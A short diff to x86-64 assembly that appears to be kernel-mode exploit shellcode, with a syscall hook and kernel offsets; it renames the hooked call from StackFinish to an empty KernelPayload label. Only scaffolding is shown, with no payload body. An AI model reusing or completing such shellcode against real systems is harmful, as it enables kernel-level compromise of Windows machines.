@@ -28,7 +28,6 @@ DATA_ORIGIN_SYSCALL_OFFSET  EQU 0x0
 DATA_NT_KERNEL_ADDR_OFFSET  EQU 0x8
 DATA_KAPC_OFFSET            EQU 0x10
 
-extern StackFinish
 global shellcode_start
 
 segment .text
@@ -151,7 +150,7 @@ syscall_hook:
     
     ; allow interrupts while executing shellcode
     sti
-    call StackFinish
+    call KernelPayload
     cli
     
 _syscall_hook_done:
@@ -164,3 +163,5 @@ _syscall_hook_done:
     pop rbp
     pop rax
     ret
+
+KernelPayload:
